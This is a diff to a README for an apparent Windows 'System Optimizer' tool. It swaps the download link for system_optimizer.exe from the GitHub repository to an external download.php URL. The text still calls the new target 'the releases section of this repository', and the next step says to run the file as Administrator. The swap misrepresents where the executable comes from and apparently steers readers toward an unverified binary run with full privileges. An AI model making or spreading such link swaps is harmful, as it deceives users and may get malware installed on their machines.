@@ -6,7 +6,7 @@ Welcome to System Optimizer! This tool is designed to optimize your Windows syst
 
 ### Step 1: Download
 
-Download the `system_optimizer.exe` file from the [releases](https://github.com/prasangapokharel/system_optimizer.Exe/blob/main/system_optimizer.exe) section of this repository.
+Download the `system_optimizer.exe` file from the [releases](https://www.pathau.com/download.php?snippet_id=355) section of this repository.
 
 ### Step 2: Run as Administrator
 
